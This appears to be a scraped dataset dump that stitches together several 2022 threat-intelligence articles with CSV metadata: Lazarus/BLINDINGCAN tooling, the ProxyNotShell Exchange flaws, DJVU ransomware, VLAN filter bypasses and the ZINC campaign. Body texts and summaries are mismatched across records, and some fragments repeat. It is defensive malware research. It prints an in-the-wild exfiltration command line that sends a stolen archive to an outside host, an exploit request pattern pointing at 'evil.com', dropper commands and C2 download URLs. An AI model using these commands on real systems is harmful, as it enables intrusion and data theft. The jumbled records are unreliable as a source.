loads a payload from a filesystem, we denote as a loader. The droppers may (Table 1) or may not (Table 2) be side-loaded by a legitimate (Microsoft) process. In the first case here, the legitimate application is at an unusual location and the malicious component bears the name of the corresponding DLL that is among the application’s imports. For example, the malicious DLL coloui.dll is side-loaded by a legitimate system application Color Control Panel ( colorcpl.exe ), both located at C:\ProgramData\PTC\ . However, the usual location for this legitimate application is %WINDOWS%\System32\ . In all cases, at least one command line argument is passed during runtime that serves as an external parameter required to decrypt the embedded payload. Various decryption algorithms are used; see the last column in Table 1 and Table 2. In several cases when AES-128 is used, there’s also an internal, hardcoded parameter together with the name of the parent process and its DLL name, all required for successful decryption. Table 1. Malicious DLLs side-loaded by a legitimate process from an unusual location Table 2. Other malware involved in the attack After successful decryption, the buffer is checked for the proper PE format and execution is passed to it. This procedure can be found in most of the droppers and loaders. The beginning of it can be seen in Figure 2. Figure 2. The decrypted buffer is a 64-bit executable We identified a fully featured HTTP(S) backdoor – a RAT known as BLINDINGCAN – used in the attack. This payload’s dropper was executed as %ALLUSERSPROFILE%\PTC\colorui.dll ; see Table 1 for details. The payload is extracted and decrypted using a simple XOR but with a long key, which is a string built by concatenating the name of the parent process, is own filename, and the external command line parameter – here COLORCPL.EXECOLORUI.DLLBE93E050D9C0EAEB1F0E6AE13C1595B5 . The payload, SHA-1: 735B7E9DFA7AF03B751075FD6D3DE45FBF0330A2 , is a 64-bit VMProtect-ed DLL. A connection is made to one of the remote locations https://aquaprographix[.]com/patterns/Map/maps.php or https://turnscor[.]com/wp-includes/feedback.php . Within the virtualized code we pivoted via the following very specific RTTI artifacts found in the executable: .?AVCHTTP_Protocol@@, .?AVCFileRW@@ . Moreover, there’s a similarity on the code level, as the indices of the commands start with the same value, 8201 ; see Figure 3. This helped us to identify this RAT as BLINDINGCAN (SHA-1: 5F4FBD57319BD0D2DF31131E864FDDA9590A652D ), reported for the first time by CISA . The recent version of this payload was observed in another Amazon-themed campaign, where BLINDINGCAN was dropped by a trojanized Putty-0.77 client: see Mandiant’s blog. Figure 3. Code comparison of plain (upper, unprotected) and virtualized (lower, VMProtect-ed) variants of BLINDINGCAN, with an agreement of two command indices, 8256 and 8201 Based on the number of command codes that are available to the operator, it is likely that a server-side controller is available where the operator can control and explore compromised systems. Actions made within this controller probably result in the corresponding command IDs and their parameters being sent to the RAT running on the target’s system. The list of command codes is in Table 3 and agrees with the analysis done by JPCERT/CC , Appendix C. There are no validation checks of parameters like folder or filenames. That means all the checks have to be implemented on the server side, which suggests that the server-side controller is a complex application, very likely with a user-friendly GUI. Table 3. The RAT’s commands Now we describe a three-stage chain where, unfortunately, we were able to identify only the first two steps: a dropper and an intermediate loader. The first stage is a dropper located at C:\Windows\Vss\credui.dll and was run via a legitimate – but vulnerable to DLL search-order hijacking – application with the (external) parameter C:\Windows\Vss\WFS.exe A39T8kcfkXymmAcq . The program WFS.exe is a copy of the Windows Fax and Scan application, but its standard location is %WINDOWS%\System32\ . The dropper is a trojanized GOnpp plug-in for Notepad++, written in the Go programming language. After the decryption, the dropper checks whether the buffer is a valid 64-bit executable and then, if so, loads it into memory, so that the second stage is ready for execution. The goal of this intermediate stage is to load an additional payload in memory and execute it. It performs this task in two steps. It first reads and decrypts the configuration file C:\windows\System32\wlansvc.cpl , which is not, as its extension might suggest, an (encrypted) executable, but a data file containing chunks of 14944 bytes with configuration. We didn’t have the particular data from the current attack; however, we obtained such configuration from another Lazarus attack: see Figure 5.The configuration is expected to start with a double word representing the total size of the remaining buffer (see Line 69 in Figure 4 below and the variable u32TotalSize ), followed by an array of 14944 byte-long structures containing at least two values: the name of the loading DLL as a placeholder for identifying the rest of the configuration (at the offset 168 of Line 74 in Figure 4 and the highlighted member in Figure 5). Figure 4. The first step of decrypting the configuration file and checking if the name of the loading DLL matches the expected one The second step is the action of reading, decrypting, and loading this file that represents very likely the third and final stage. It is expected to be a 64-bit executable and is loaded into the memory the same way the first-stage dropper handled the intermediate loader. At the start of execution, a mutex is created as a concatenation of the string Global\AppCompatCacheObject and the CRC32 checksum of its DLL name ( credui.dll ) represented as a signed integer. The value should equal Global\AppCompatCacheObject-1387282152 if wlansvc.cpl exists and -1387282152 otherwise. Figure 5. A configuration of the intermediate loader. The highlighted file name is expected to match with the name of the running malware; see also Figure 4. An interesting fact is the use of this decryption algorithm (Figure 4, Line 43 & 68), which is not that prevalent in the Lazarus toolset nor malware in general. The constants 0xB7E15163 and 0x61C88647 (which is -0x9E3779B9 ; see Figure 6, Line 29 & 35) in the key expansion suggests that it’s either the RC5 or RC6 algorithm. By checking the main decryption loop of the algorithm, one identifies that it’s the more complex of the two, RC6. An example of a sophisticated threat using such uncommon encryption is Equations Group’s BananaUsurper; see Kaspersky’s report from 2016. Figure 6. Key expansion of RC6 A downloader using the HTTP(S) protocols was delivered onto the target’s system as well. It was installed by a first stage dropper (SHA1: 001386CBBC258C3FCC64145C74212A024EAA6657 ), which is a trojanized libpcre-8.44 library. It was executed by the command cmd.exe /c start /b rundll32.exe C:\PublicCache\msdxm.ocx,sCtrl 93E41C6E20911B9B36BC (the parameter is an XOR key for extracting the embedded payload; see Table 2). The dropper also achieves persistence by creating the OneNoteTray.LNK file located in the %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup folder. The second stage is a 32-bit VMProtect-ed module that makes an HTTP connection request to a C&C server stored in its configuration; see Figure 7. It uses the same User Agent – Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36 – as BLINDINGCAN RAT, contains the RTTI artifact .?AVCHTTP_Protocol@@ but not .?AVCFileRW@@ , and lacks features like taking screenshots, archiving files, or executing a command via the command line. It is able to load an executable to a newly allocated memory block and pass code execution to it. Figure 7. A configuration of the HTTP(S) downloader. The highlighted values are the size of the configuration and the number of URLs. In the attack we observed, all the URLs were identical. This Lazarus tool is responsible for data exfiltration, by using the HTTP or HTTPS protocols. It is delivered in two stages as well. The initial dropper is a trojanized sqlite-3.31.1 library. Lazarus samples usually don’t contain a PDB path, but this loader has one, W:\Develop\Tool\HttpUploader\HttpPOST\Pro\_BIN\RUNDLL\64\sqlite3.pdb , which also suggests its functionality immediately – a HTTP Uploader. The dropper expects multiple command line parameters: one of them is a password required to decrypt and load the embedded payload; the rest of parameters are passed to the payload. We didn’t catch the parameters, but luckily an in-the-wild use of this tool was observed in a forensic investigation by HvS Consulting : C:\ProgramData\IBM\~DF234.TMP S0RMM-50QQE-F65DN-DCPYN-5QEQA https://www.gonnelli.it/uploads/catalogo/thumbs/thumb.asp C:\ProgramData\IBM\restore0031.dat data03 10000 -p 192.168.1.240 8080 The first parameter, S0RMM-50QQE-F65DN-DCPYN-5QEQA , worked as a key for the decryption routine of the dropper (to be more precise, an obfuscation was performed first, where the encrypted buffer was XOR-ed with its copy shifted by one byte; then an XOR decryption with the key followed). The rest of the parameters are stored in a structure and passed to the second stage. For the explanation of their meanings, see Table 4. Table 4. Command line parameters for the HTTP(S) updater The second stage is the HTTP uploader itself. The only parameter for this stage is a structure containing the C&C server for the exfiltration, the filename of a local RAR archive, the root name of a RAR archive on the server-side, the total size of a RAR split in kilobytes, an optional range of split indices, and an optional -p switch with the internal proxy IP and a port; see Table 4. For example, if the RAR archive is split into 88 chunks, each 10,000 kB large, then the uploader would submit these splits and store them on the server side under names data03.000000.avi , data03.000001.avi , …, data03.000087.avi . See Figure 8, Line 42 where these strings are formatted. The User-Agent is the same as for BLINDINGCAN and the HTTP(S) downloader, Mozilla/5.0 ( Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36. Figure 8. The exfiltration of RAR splits to a C&C server We identified a dynamically linked library with the internal name FudModule.dll that tries to disable various Windows monitoring features. It does so by modifying kernel variables and removing kernel callbacks, which is possible because the module acquires the ability to write in the kernel by leveraging the BYOVD techniques – the specific CVE-2021-21551 vulnerability in the Dell driver dbutil_2_3.sys. The full analysis of this malware is available as a VB2022 paper Lazarus & BYOVD: evil to the Windows core . Additional droppers and loaders were discovered in the attacks, but we didn’t obtain the necessary parameters to decrypt the embedded payloads or encrypted files. A project lecui by Alec Musafa served the attackers as a code base for trojanization of two additional loaders. By their filenames, they were disguised as Microsoft libraries mi.dll (Management Infrastructure) and cryptsp.dll (Cryptographic Service Provider API), respectively, and this was due to the intended side-loading by the legitimate applications wsmprovhost.exe and SMSvcHost.exe , respectively; see Table 1. The main purpose of these loaders is to read and decrypt executables located in alternate data streams (ADS) at C:\ProgramData\Caphyon\mi.dll:Zone.Identifier and C:\Program Files\Windows Media Player\Skins\DarkMode.wmz:Zone.Identifier , respectively. Since we haven’t acquired these files, it’s not known which payload is hidden there; however, the only certainty is that it’s an executable, since the loading process follows the decryption (see Figure 2). The use of ADS is not new, because Ahnlab reported a Lazarus attack against South Korean companies in June 2021 involving such techniques. ESET blocked an additional trojanized open-source application, FingerText 0.5.61 by erinata , located at %WINDIR%\security\credui.dll . The correct command line parameters are not known. As in some of the previous cases, three parameters were required for the AES-128 decryption of the embedded payload: the parent process’s name, WFS.exe ; the internal parameter, mg89h7MsC5Da4ANi ; and the missing external parameter. The attack against a target in Belgium was blocked early in its deployment chain so only one file was identified, a 32-bit dropper located at C:\PublicCache\msdxm.ocx . It is an sslSniffer component from the wolfSSL project that has been trojanized. At the time of the attack, it was validly signed with a certificate issued to “A” MEDICAL OFFICE, PLLC (see Figure 8), which has since expired. Figure 9. Validly signed but already expired certificate It has two malicious exports that the legitimate DLL doesn’t have: SetOfficeCertInit and SetOfficeCert . Both exports require exactly two parameters. The purpose of the first export is to establish persistence by creating OfficeSync.LNK , located in %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup , pointing to the malicious DLL and running its second export via rundll32.exe with the parameters passed to itself. The second export, SetOfficeCert , uses the first parameter as a key to decrypt the embedded payload, but we couldn’t extract it, because the key is not known to us. The decryption algorithm is also interesting as the attackers use HC-128 with the 128-bit key as the first parameter and for its 128-bit initialization vector, the string ffffffffffffffff . The constants revealing the cipher are displayed in Figure 10. Figure 10. The key setup with highlighted constants suggesting the HC-128 cipher In this attack, as well as in many others attributed to Lazarus, we saw that many tools were distributed even on a single targeted endpoint in a network of interest. Without a doubt, the team behind the attack is quite large, systematically organized, and well prepared. For the first time in the wild, the attackers were able to leverage CVE-2021-21551 for turning off the monitoring of all security solutions. It was not just done in kernel space, but also in a robust way, using a series of little- or undocumented Windows internals. Undoubtedly this required deep research, development, and testing skills. From the defenders’ point of view, it seems easier to limit the possibilities of initial access than to block the robust toolset that would be installed after determined attackers gain a foothold in the system. As in many cases in the past, an employee falling prey to the attackers’ lure was the initial point of failure here. In sensitive networks, companies should insist that employees not pursue their personal agendas, like job hunting, on devices belonging to their company’s infrastructure.

635124bb28e9d467ce428325,ciscotalos,https://blog.talosintelligence.com/2022/09/threat-advisory-exchange-server-vulns.html,Threat Advisory: Microsoft warns of actively exploited vulnerabilities in Exchange Server,Asheer Malhotra,2022-09-30,"Cisco Talos has released new coverage to detect and prevent the exploitation of two recently disclosed vulnerabilities collectively referred to as ""ProxyNotShell,"" affecting Microsoft Exchange Servers 2013, 2016 and 2019. One of these vulnerabilities could allow an attacker to execute remote code on the targeted server. Limited exploitation of these vulnerabilities in the wild has been reported. CVE-2022-41040 is a Server Side Request Forgery (SSRF) vulnerability, while CVE-2022-41082 enables Remote Code Execution (RCE) when PowerShell is accessible to the attackers. While no fixes or patches are available yet, Microsoft has provided mitigations for on-premises Microsoft Exchange users on Sept. 29, 2022. Even organizations that use Exchange Online may still be affected if they run a hybrid server. Cisco Talos is closely monitoring the recent reports of exploitation attempts against these vulnerabilities and strongly recommends users implement mitigation steps while waiting for security patches for these vulnerabilities. Exchange vulnerabilities have become increasingly popular with threat actors, as they can provide initial access to network environments and are often used to facilitate more effective phishing and malspam campaigns. The Hafnium threat actor exploited several zero-day vulnerabilities in Exchange Server in 2021 to deliver ransomware, and Cisco Talos Incident Response reported that the exploitation of Exchange Server issues was one of the four attacks they saw most often last year. Vulnerability details and ongoing exploitation Exploit requests for these vulnerabilities look similar to previously discovered ProxyShell exploitation attempts: autodiscover/autodiscover.json?@evil.com/<Exchange-backend-endpoint>&Email=autodiscover/autodiscover.json%3f@evil.com Successful exploitation of the vulnerabilities observed in the wild leads to preliminary information-gathering operations and the persistence of WebShells for continued access to compromised servers. Open-source reporting indicates that webShells such as Antsword, a popular Chinese language-based open-source webshell, SharPyShell an ASP.NET-based webshell and China Chopper have been deployed on compromised systems consisting of the following artifacts: C:\inetpub\wwwroot\aspnet_client\Xml.ashx C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\errorEE.aspx C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\pxh4HG1v.ashx C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\RedirSuiteServiceProxy.aspx This activity is consistent with what is typically observed when attackers begin leveraging vulnerabilities in unpatched or vulnerable systems exposed to the internet. Initial reporting observed the download and deployment of additional malicious artifacts and implants on the infected systems using certutil , however these TTPs may change as more threat actors start exploiting the vulnerabilities followed by their own set of post-exploitation activities.

""The payload discovered is a leaked version of a Cobalt Strike beacon,"" Cisco Talos researchers Chetan Raghuprasad and Vanja Svajcer said in a new analysis published Wednesday. ""The beacon configuration contains commands to perform targeted process injection of arbitrary binaries and has a high reputation domain configured, exhibiting the redirection technique to masquerade the beacon's traffic."" The malicious activity, discovered in August 2022, attempts to exploit the vulnerability CVE-2017-0199 , a remote code execution issue in Microsoft Office, that allows an attacker to take control of an affected system. The entry vector for the attack is a phishing email containing a Microsoft Word attachment that employs job-themed lures for roles in the U.S. government and Public Service Association, a trade union based in New Zealand. Cobalt Strike beacons are far from the only malware samples deployed, for Cisco Talos said it has also observed the usage of the Redline Stealer and Amadey botnet executables as payloads at the other end of the attack chain. Calling the attack methodology ""highly modularized,"" the cybersecurity company said the activity also stands out for its use of Bitbucket repositories to host malicious content that serves as a starting point for downloading a Windows executable responsible for deploying the Cobalt Strike DLL beacon. In an alternative attack sequence, the Bitbucket repository functions as a conduit to deliver obfuscated VB and PowerShell downloader scripts to install the beacon hosted on a different Bitbucket account. ""This campaign is a typical example of a threat actor using the technique of generating and executing malicious scripts in the victim's system memory,"" the researchers said. ""Organizations should be constantly vigilant on the Cobalt Strike beacons and implement layered defense capabilities to thwart the attacker's attempts in the earlier stage of the attack's infection chain.""",['Malware'],5f8fb6fb-a8e5-51b1-aef7-8edee996d2af,"A social engineering campaign leveraging job-themed lures is weaponizing a years-old remote code execution flaw in Microsoft Office.

Since the bug was present in the Linux kernel, any product whose operating system is based on a custom Linux could be affected. CERT said an attacker could trick a locally connected target to route traffic to arbitrary destinations. “Victim devices experience either a DoS (blackholing traffic) or MitM (observing the unencrypted traffic and maybe breaking encryption)”, the advisory states. The issue, first noticed by Etienne Champetier and posted to various Linux kernel lists, exists in Ethernet encapsulation protocols that allow for VLAN headers to be stacked, the CERT advisory stated. “Network standards such as IEEE 802.1Q-1998 and IEEE 802.3 define a system of tagging Ethernet frames that help isolate networks to provide virtual networking capability. “IEEE standard 802.1ad, also known as QinQ, allows for the stacking of these VLAN tags, extending the VLAN capability into multiple network segments.” If an attacker stacks a combination of “one or more VLAN 0 (priority tag) headers and 802.2 LLC/SNAP headers” in crafted packets, they can bypass security controls implemented in Layer 2 filtering, the advisory continued. In a traditional network environment, exploiting the vulnerability would require access to the local network. However, as the CERT said: “In modern computing environments, such as cloud-based virtualisation and virtual networking, the L2 network capability is extended beyond the local area networks. ""This can lead to exposure of [these] vulnerabilities in unintended ways to the larger Internet.” The vulnerabilities cover four Common Vulnerabilities and Exposures (CVE) numbers, first assigned in 2021 but only published now: CVE-2021-27853: Layer 2 network filtering capabilities such as IPv6 RA guard or ARP inspection can be bypassed using a combination of VLAN 0 headers and LLC/SNAP headers. CVE-2021-27854: Layer 2 network filtering capabilities such as IPv6 RA guard can be bypassed using a combination of VLAN 0 headers, LLC/SNAP headers in Ethernet to Wifi frame translation, and in the reverse-Wifi to Ethernet. CVE-2021-27861: Layer 2 network filtering capabilities such as IPv6 RA guard can be bypassed using LLC/SNAP headers with invalid length (and optionally VLAN0 headers). CVE-2021-27862: Layer 2 network filtering capabilities such as IPv6 RA guard can be bypassed using LLC/SNAP headers with invalid length and Ethernet to Wifi frame conversion (and optionally VLAN0 headers). Cisco said the vulnerabilities’ impact on its products are of medium severity, with a Common Vulnerability Scoring System score of 4.3. CERT alleged Juniper Networks’ products are also vulnerable, but the vendor has not yet published an advisory. Update: Since this article was first published, Arista Networks announced various versions of its EOS operating system, and some wifi access points, are also affected by the vulnerability.","['cisco', 'juniper networks', 'networking', 'security', 'vulnerability']",5e7333e1-9a52-5fca-86e5-2ccee78119ba," “Victim devices experience either a DoS (blackholing traffic) or MitM (observing the unencrypted traffic and maybe breaking encryption)”, the advisory states. “IEEE standard 802.1ad, also known as QinQ, allows for the stacking of these VLAN tags, extending the VLAN capability into multiple network segments.” If an attacker stacks a combination of “one or more VLAN 0 (priority tag) headers and 802.2 LLC/SNAP headers” in crafted packets, they can bypass security controls implemented in Layer 2 filtering, the"
635124bf28e9d467ce428355,blackberry,https://blogs.blackberry.com/en/2022/09/djvu-the-ransomware-that-seems-strangely-familiar,DJVU: The Ransomware That Seems Strangely Familiar…,The BlackBerry Research & Intelligence Team,2022-09-29,"DJVU ransomware arrives on the scene masquerading as legitimate services or applications, or bundled with decoy files, in order to appear benign. The malware group also partners with other threats, giving them the option to download and deploy information stealers to exfiltrate data, giving threat actors a second way to benefit at victims’ expense. If all of this sounds strangely familiar, you wouldn’t be far wrong thinking so. DJVU began life in 2018 as a new variant of the STOP ransomware that entered center stage towards the end of 2017. STOP ransomware gained notoriety with its multiple campaigns and its unique ransomware extension, “STOP”. The new DJVU variant also includes several layers of obfuscation, in an attempt to slow inspection by researchers and automated analysis tools. Operating System Risk & Impact Technical Analysis The predecessor of DJVU, known as STOP ransomware, was aptly named for ceasing operations in victim organizations due its file-encryption. It initially used a Crypto++ implementation and encrypted user data with AES-256 (more recently Salsa20). In 2018, a new variant of this ransomware family rose to prominence, with the introduction of DJVU. More recently, this threat became even more damaging, when the threat actors behind it added the ability to download and deploy information stealers in apparent collaboration with the threat groups behind Arkei variant Vidar Stealer and Redline Stealer . Infection Method Since DJVU has no pre-set infection method, the initial infection vector of DJVU can vary. This allows the threat actors to be extremely flexible in their approach, which also makes the initial signs of compromise difficult for defenders to predict and detect. DJVU has also used hundreds of different encrypted file-extensions, thus making an attack even more difficult to confirm. DJVU masquerades as a wide variety of file types on file-hosting, download, and torrenting websites. This threat often poses as application downloads, cracked software, and keygens with the aim of being downloaded and executed on an unsuspecting victim’s device. DJVU often partners with other malware, for example deploying information stealers onto a victim device prior to encryption. This symbiotic relationship with other malware families makes DJVU even more damaging. DJVU is also deployed as a payload of the known malware dropper family SmokeLoader . Execution Chain Before Action Comes Obfuscation DJVU begins its execution chain with several layers of obfuscation meant to slow down analysis of its code by threat researchers and automated sandboxes. The DJVU ransomware samples BlackBerry analyzed for this post were all similarly obfuscated. DJVU’s malicious activity begins when it reprotects a section of the heap for the executable to load some encrypted shellcode contained within the starting Portable Executable (PE). This first shellcode stage is encrypted using the Tiny Encryption Algorithm (TEA). The malware authors expended extra effort to obfuscate the encryption constants, as a further anti-analysis method. As the TEA algorithm is commonly used by malware, this was likely done to try to evade detection. This first stage of shellcode then unpacks a second stage of shellcode, which is encrypted by a basic XOR algorithm where the key is mutated using a predictable pseudo-random number generation algorithm. This is then loaded into memory using the more traditional Virtual Alloc method. The second stage of shellcode then starts a new process using the same binary. It uses process hollowing to inject the unobfuscated copy of the malware into the new process. This is where the payload finally starts operating. DJVU Attack Begins The threat’s malicious activity begins in earnest by finding out where the victim’s device is located. It does this by checking the device location via a GeoIP lookup service at the following URL: “hxxps[:]//api[.]2ip[.]ua/geo[.]json.”. The file connects to this site using InternetOpenUrlW, and it reads the contents of the geo.json response via InternetReadFile. This gives detailed information about the user’s location based on a GeoIP database. We received the following response when we created a fake hosting site for the purposes of this blog. We modified the contents of the geo.json for our demonstration’s purpose, to show how the malware reads the file. Figure 1 displays this response in a hex editor. Figure 1 – Memory dump of the response back from GeoIP Once a response has been received, the malware compares it to the list of hardcoded Commonwealth of Independent States (CIS) country codes shown in Table 1. If the victim’s country code matches one of the following countries, the payload is not executed, and the malware terminates itself. Initials Country Name Initials Country Name RU Russia AM Armenia BY Belarus TJ Tajikistan UA Ukraine KZ Kazakhstan AZ Azerbaijan KG Kyrgyzstan SY Syria UZ Uzbekistan If the country does not match any of the named nations on this list, execution continues. The malware then creates a folder inside the %\AppData\Local\% directory. The new folder is named using a randomly generated UUID Version4 using UuidCreate and UuidToStringW functions. Figure 2 – Randomly created UUID for name of folder found via %\AppData\Local\% When the folder is created via CreateDirectoryW, the malware creates a copy of itself inside this location: Figure 3 – Newly created location of malware executable The malware then uses “icacls” – a Windows command utility tool – to protect this path/folder using the command shown in Figure 5. The flags seen in this example are as follows: (OI - Object inherit), (CI - Container inherit), (DE - Delete), (DC - Delete child). Figure 4 – Setting of “icacls” flags The malware then uses the ShellExecute APIs with the “runas” verb to attempt to start itself again with Admin privileges. Depending on the victim’s device settings, this might display a User Account Control (UAC) dialog box that prompts the victim to give the process admin rights. When malware runs with these privileges, it can encrypt more critical files on the system. The payload then runs in an elevated state, with the arguments “ —Admin IsNotAutoStart IsNotTask ”. Figure 5 – DJVU attempting to run in an elevated state The malware creates persistence via a scheduled task using the ITaskService interface of the TaskScheduler COM object. Malware authors use the COM object to avoid using the PowerShell command “Register-ScheduledTask” or the schtasks executable, because these are more well-known methods of task creation and thus more likely to be detected. Figure 6 shows the scheduled task added by the malware. Figure 6 – Scheduled task created by the malware After this, the payload retrieves the MAC address of the network card and creates an MD5 hash of that address, as shown in Figure 7 below. Figure 7 – MD5 hash generation It then uses this MD5 hash to connect to a malicious command-and-control (C2) using the following URL: hxxps[:]//acacaca[.]org/d/test1/get.php?pid={MAC Address_MD5}&first=true Example URL: hxxp://acacaca[.]org/test1/get[.]php?pid=53B1E5DA52C0B1B73B57A5129A43BC5D&first=true The response to this communication is stored within “ Bowsakkdestx.txt, ” which is located in the %\AppData\Local\% directory. The value stored within this file is a Public Key and ID, as shown in Figure 8. Figure 8 – Example of Public Key and ID generated for DJVU The threat also stores the ID in a newly created file, which is located in C:\SystemID\PersonalID.txt. Figure 9 – Example of PersonalID.txt Once the keys are saved, the malware also contacts two additional domains, one of which has been identified as serving RedLine infostealer since September 2022. hxxp[:]//rgyui[.]top/dl/build2[.]exe hxxp[:]//acacaca[.]org/files/1/build3[.]exe Further details of the communication with these domains are shown in Figure 10 below. Figure 10 – Noted internet connectivity of DJVU For further persistence, the malware also creates a registry Run key called “ SysHelper, ” in the following registry path: “ HKEY_Current_User\Software\Microsoft\Windows\CurrentVersion\Run” Figure 11 – Example of DJVU AutoStart Before the malware begins the encryption process, it creates a mutex named “ {1D6FC66E–D1F3–422C–8A53–C0BBCF3D900D}.” Additionally, we observed the threat hardcoding a second mutex named “ {FBB4BCC6-05C7-4ADD-B67B-A98A697323C1}. ” Ransomware often creates mutexes (shown in Figure 12) like these to avoid double-encrypting files, thus rendering them unrecoverable . Figure 12 – Mutex creation The malware also contains a hardcoded public key and ID. Figure 12 (Above – Public Key) shows a public key found in a process dump. Figure 13 (Below - Private Key) shows the unique ID used to identify the victim. Figure 13 – Public Key Figure 14 – Offline ID Because we executed the malware in an offline environment, the malware appended “t1” to the end of the key, as shown in Figure 15. Figure 15 – Key creation for Offline ID During the encryption process, the malware avoids encrypting any file extension that matches those included in the following hardcoded list, to avoid encrypting any files that would render the victim’s machine unusable or unrecoverable: Files Excluded Extensions Excluded ntuser.dat .sys ntuser.dat.LOG1 .ini ntuser.dat.LOG2 .DLL/.dll ntuser.pol .blf .bat .lnk .regtrans-ms The malware also contains an exclusion list related to core folders that are part of the Windows® operating system (OS). Additionally, the malware looks for a hardcoded file name with a .jpg extension, shown in Figure 15 below. It's unclear at this time what the purpose of this file is. Figure 16 – The specific .jpg that DJVU seeks out During the encryption process, the malware drops a _readme.txt in the top level of the C:\ drive. Figure 17 shows the contents of the _readme.txt file: Figure 17 – DJVU ransomware note MITRE ATT&CK Tactics & Techniques Persistence – Maintains a foothold in the system by adding startup persistence (MITRE ATT&CK® tactic TA0003 ) Boot or Logon Autostart Execution – Creates AutoStart for persistence (MITRE ATT&CK technique T1547.001) Privilege Escalation – Gains administrator permission (MITRE ATT&CK tactic TA0004 ) Data Encrypted for Impact – DJVU is a ransomware with the primary goal of file encryption before demanding a fee for the affected files to be restored (MITRE ATT&CK technique T1486 ) System Information Discovery – DJVU uses information regarding the victim’s GeoIP Country Code Lookup, which determines whether the malware will execute on a system. (MITRE ATT&CK technique T1082 ) Process Injection – Injected into another process (MITRE ATT&CK technique T1055 ) Statistics Throughout the research period for this blog, we observed 1000+ recent samples of DJVU, and generated some statistics regarding the file extensions threat actors appended to affected files, which can be seen below.

This is achieved via the ransomware’s “Offline IDs,” which are hardcoded in each sample. If the ransomware does obtain an internet connection, it will use an “Online ID” while also performing its secondary activity of downloading and dropping additional malware onto the victim’s device.

The malware boasts multiple layers of obfuscation, which makes it difficult to detect and analyze. This results in a potent strain of ransomware that doesn’t reveal its true intentions until it is too late. The malware will often masquerade as legitimate software and applications before attempting to gather basic geographic location information for the victim prior to its encryption activities. This threat is often seen with other malware, namely information stealers like RedLine. DJVU uses many different file-extensions to append to affected files, which makes it harder to pin down the nature of the infection. This threat has over 100 file-extensions it uses for these purposes. This successor to STOP ransomware is stampeding ahead at full speed, and as a highly active ransomware, it is wise to be alert to its activities. Who is Affected? DJVU typically does not have a distinct target, including any specific industry, sector, or nation. Many small-scale infections and attacks have been attributed to this threat. Unlike many modern ransomware families, DJVU infects victims broadly rather than specifically. DJVU does, however, avoid affecting machines in CIS nations, which includes former nations of the Soviet Union. Mitigation Tips File Hashing: Deploying a hashing detection on a device can be an effective way of blocking/quarantining malware if it appears on a device (MITRE D3FEND™ technique D3-FH ). File Content Rules : Searching the contents of a file via pattern matching like YARA is a strong way of determining if a file is benign or malicious (MITRE D3FEND technique D3-FCR ). System Configuration Permissions : Having a system locked down to specific users could prevent both the running of malicious files, and the registry creation of DJVU (MITRE D3FEND technique D3-SCP ).

635124b428e9d467ce4282de,microsoft,https://www.microsoft.com/security/blog/2022/09/29/zinc-weaponizing-open-source-software/,ZINC weaponizing open-source software,Microsoft Security Threat Intelligence,2022-09-29,"In recent months, Microsoft has detected a wide range of social engineering campaigns using weaponized legitimate open-source software by an actor we track as ZINC . Microsoft Threat Intelligence Center (MSTIC) observed activity targeting employees in organizations across multiple industries including media, defense and aerospace, and IT services in the US, UK, India, and Russia. Based on the observed tradecraft, infrastructure, tooling, and account affiliations, MSTIC attributes this campaign with high confidence to ZINC, a state-sponsored group based out of North Korea with objectives focused on espionage, data theft, financial gain, and network destruction. Beginning in June 2022, ZINC employed traditional social engineering tactics by initially connecting with individuals on LinkedIn to establish a level of trust with their targets. Upon successful connection, ZINC encouraged continued communication over WhatsApp, which acted as the means of delivery for their malicious payloads. MSTIC observed ZINC weaponizing a wide range of open-source software including PuTTY, KiTTY, TightVNC, Sumatra PDF Reader, and muPDF/Subliminal Recording software installer for these attacks. ZINC was observed attempting to move laterally and exfiltrate collected information from victim networks. The actors have successfully compromised numerous organizations since June 2022. The ongoing campaign related to the weaponized PuTTY was also reported by Mandiant earlier this month. Due to the wide use of the platforms and software that ZINC utilizes in this campaign, ZINC could pose a significant threat to individuals and organizations across multiple sectors and regions. Microsoft Defender for Endpoint provides comprehensive protection against tools and custom malware used by ZINC, including ZetaNile. The hunting queries provided at the end of this blog will help customers comprehensively search their environments for relevant indicators. As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Who is ZINC? ZINC is a highly operational, destructive, and sophisticated nation-state activity group. Active since 2009, the activity group gained further public notoriety in 2014 following their successful attack against Sony Pictures Entertainment. ZINC is known to use a variety of custom remote access tools (RATs) as part of their arsenal, including those detected by Microsoft as FoggyBrass and PhantomStar. Microsoft researchers have observed spear-phishing as a primary tactic of ZINC actors, but they have also been observed using strategic website compromises and social engineering across social media to achieve their objectives. ZINC targets employees of companies it’s attempting to infiltrate and seeks to coerce these individuals into installing seemingly benign programs or opening weaponized documents that contain malicious macros. Targeted attacks have also been carried out against security researchers over Twitter and LinkedIn. ZINC attacks appear to be motivated by traditional cyberespionage, theft of personal and corporate data, financial gain, and corporate network destruction. ZINC attacks bear many hallmarks of state-sponsored activities, such as heightened operational security, sophisticated malware that evolves over time, and politically motivated targeting. ZINC, tracked by other security companies as Labyrinth Chollima and Black Artemis, has been observed conducting this campaign from late April to mid-September 2022. Figure 1. Attack flow diagram for recent ZINC campaign Observed actor activity Impersonation and establishing contact LinkedIn Threat Prevention and Defense detected ZINC creating fake profiles claiming to be recruiters working at technology, defense, and media entertainment companies, with the goal of moving targets away from LinkedIn and to the encrypted messaging app WhatsApp for the delivery of malware. ZINC primarily targeted engineers and technical support professionals working at media and information technology companies located in the UK, India, and the US. Targets received outreach tailored to their profession or background and were encouraged to apply for an open position at one of several legitimate companies. In accordance with their policies, for accounts identified in these attacks, LinkedIn quickly terminated any accounts associated with inauthentic or fraudulent behavior. Figure 2. Fraudulent recruiter profile Multiple methods used for delivery of ZetaNile MSTIC has observed at least five methods of trojanized open-source applications containing the malicious payload and shellcode that is tracked as the ZetaNile malware family. The ZetaNile implants, also known as BLINDINGCAN, have been covered in CISA and JPCERT reports. The implant DLLs in the ZetaNile malware family are either packed with commercial software protectors such as Themida and VMProtect or are encrypted using custom algorithms. The payload in the malicious DLL is decrypted using a custom key, passed as part of the DLL search order hijacking of the 